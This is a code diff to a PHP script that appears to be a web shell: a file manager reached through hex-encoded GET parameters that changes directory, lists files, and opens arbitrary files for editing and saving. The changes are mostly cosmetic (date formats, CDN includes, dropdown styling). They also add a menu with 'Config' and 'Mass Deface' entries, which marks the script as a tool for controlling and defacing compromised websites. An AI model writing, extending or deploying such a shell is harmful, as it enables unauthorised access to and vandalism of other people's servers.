@@ -14,7 +14,7 @@ function files($dir, $type) {
 		}
 		$file['fname'] = basename($file['names']);
 		$file['fsize'] = is_dir($file['names']) ? @filetype($file['names']) : size($file['names']);
-		$file['ftime'] = ftime($file['names']);
+		$file['ftime'] = ftime($file['names'], 1);
 		$result[] = $file;
 	}
 	return $result;
@@ -261,8 +261,15 @@ function alert($msg) {
 	</body>
 	<?php
 }
-function ftime($filename) {
-	return date("d M Y H:i:s", @filemtime($filename));
+function ftime($filename, $type) {
+	switch ($type) {
+		case 1:
+			return date("d/m/Y", @filemtime($filename));
+			break;
+		case 2:
+			return date("d/m/Y H:i:s", @filemtime($filename));
+			break;
+	}
 }
 function freadd($filename) {
 	return htmlspecialchars(file_get_contents($filename));
@@ -309,13 +316,17 @@ if (isset($_GET['v'])) {
 	@chdir(unhex($_GET['v']));
 }
 ?>
-
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.3.js"></script>
+<script src="https://kit.fontawesome.com/bc4b489468.js" crossorigin="anonymous"></script>
 </script>
 <style type="text/css">
 	body {
@@ -360,10 +371,66 @@ if (isset($_GET['v'])) {
 		height:100px;
 	}
 	.count {
-		border-top:1px solid red;
 		padding:7px;
 		padding-left:20px;
 		padding-right: 20px;
+	}
+	.none {
+		list-style-type: none;
+	}
+	#top-nav {
+		float: right;
+	}
+	#top-nav ul {
+		list-style-type: none;
+	}
+	#top-nav ul li a{
+		padding-right:10px;
+		padding-left:10px;
+		padding-top:4px;
+		padding-bottom: 4px;
+		border-radius:5px;
+		font-size:20px;
+	}
+	#top-nav ul li a:hover{
+		background-color: #666;
+	}
+	/* Dropdown */
+	li.dropdown {
+		position: relative;
+	}
+
+	ul.dropdown-menu{
+  		min-width: 120px;
+  		top: 100%;
+	}
+	ul.dropdown-menu li.dropdown_href{
+  		display: block !important;
+  		white-space: nowrap;
+  		padding-left:10px;
+  		padding-right:10px;
+	}
+	/* Sub Dropdown */
+	ul.dropdown-menu ul.dropdown-menu{
+  		background-color: #f00 !important;
+ 		float:;
+	}
+
+	/* Display none by Default */
+	ul.dropdown-menu{
+  		display: none;  
+	}
+	.clear{clear: both;}
+	@media (min-width: 481px) and (max-width: 767px) {
+  		
+	}
+	@media (min-width: 320px) and (max-width: 480px) {
+		.p {
+			overflow-x: auto;
+			overflow-y: hidden;
+			white-space: nowrap;
+			min-width: 230%;
+		}
 	}
 </style>
 <script type="text/javascript">
@@ -372,11 +439,51 @@ if (isset($_GET['v'])) {
 			window.location = $(this).data("href");
 		});
 	});
+
+	jQuery(document).ready(function($) {
+		$(".dropdown_href").click(function() {
+			window.location = $(this).data("href");
+		});
+	});
+
+	$(function(){
+		$('li.dropdown > a').on('click',function(event){
+			event.preventDefault()
+			$(this).parent().find('ul').first().toggle(300);
+			$(this).parent().siblings().find('ul').hide(200);
+			$(this).parent().find('ul').mouseleave(function(){  
+				var thisUI = $(this);
+				$('html').click(function(){
+					thisUI.hide();
+					$('html').unbind('click');
+				});
+			});
+		});
+	});
+
 </script>
 <div class="container">
 	<div class="card" style="max-height:100%;">
 		<div class="card-body">
-			<h5 class="card-title"><?= text(1) ?></h5>
+			<div class="row">
+				<div class="col">
+					<h5 class="card-title"><a href="<?= $_SERVER['PHP_SELF'] ?>"><?= text(1) ?></a></h5>
+				</div>
+				<div class="col">
+					<div id="top-nav">
+					<ul class="">
+						<li class="dropdown">
+							<a href="#"><i class="fas fa-bars"></i></a>
+							<ul class="dropdown-menu">
+								<li class="dropdown_href" data-href='#'>Config</li>
+								<li class="dropdown_href" data-href='#'>Mass Deface</li>
+								<li class="dropdown_href" data-href='#'>Sub Item</li>
+							</ul>
+						</li>
+					</ul>
+				</div>
+				</div>
+			</div>
 			<?php
 		@$_GET['file'] = unhex($_GET['file']);
 		switch (@$_GET['a']) {
@@ -393,7 +500,7 @@ if (isset($_GET['v'])) {
 				<table class="tablet" width="100%">
 					<tr>
 						<td colspan="3">
-							<a href="?v=<?= hex(getcwd()) ?>">back</a>
+							<a href="?v=<?= hex(getcwd()) ?>"><i class="fas fa-arrow-left"></i></a>
 						</td>
 					</tr>
 					<tr>
@@ -404,12 +511,12 @@ if (isset($_GET['v'])) {
 					<tr>
 						<td>Last Modified</td>
 						<td>:</td>
-						<td><?= ftime($_GET['file'])?></td>
+						<td><?= ftime($_GET['file'], 2)?></td>
 					</tr>
 					<form method="post">
 						<tr>
 							<td colspan="3">
-								<textarea class="form-control" rows="25" name="data"><?= freadd($_GET['file']) ?></textarea>
+								<textarea class="form-control" rows="20" name="data"><?= freadd($_GET['file']) ?></textarea>
 							</td>
 						</tr>
 						<tr>
@@ -447,7 +554,7 @@ if (isset($_GET['v'])) {
 					<tr>
 						<td>Last Modified</td>
 						<td>:</td>
-						<td><?= ftime($_GET['file'])?></td>
+						<td><?= ftime($_GET['file'], 2)?></td>
 					</tr>
 					<form method="post">
 						<tr>
@@ -476,9 +583,10 @@ if (isset($_GET['v'])) {
 		<ul class="list-group list-group-flush">
 			<?php
 			foreach (files(getcwd(), 'dir') as $key => $value) { ?>
+				<div class="p">
 				<li class="list-group-item">
 					<div class="row" title='<?= $value['fname'] ?>'>
-						<div class="col text-truncate clickable" data-href='?v=<?= hex($value['names']) ?>'>
+						<div class="col-5 text-truncate clickable" data-href='?v=<?= hex($value['names']) ?>'>
 							<img class="icon" src="https://image.flaticon.com/icons/svg/715/715676.svg"> 
 							<?= $value['fname'] ?>
 						</div>
@@ -506,11 +614,13 @@ if (isset($_GET['v'])) {
 						</div>
 					</div>
 				</li>
+				</div>
 			<?php }
 			foreach (files(getcwd(), 'file') as $key => $value) { ?>
+				<div class="p">
 				<li class="list-group-item">
 					<div class="row" title='<?= $value['fname'] ?>' >
-						<div class="col text-truncate">
+						<div class="col-5 text-truncate">
 							<img class="icon" src="<?= geticon($value['names']) ?>"> 
 							<?= $value['fname'] ?>
 						</div>
@@ -544,6 +654,7 @@ if (isset($_GET['v'])) {
 						</div>
 					</div>
 				</li>
+				</div>
 			<?php }
 			?>
 		</ul>
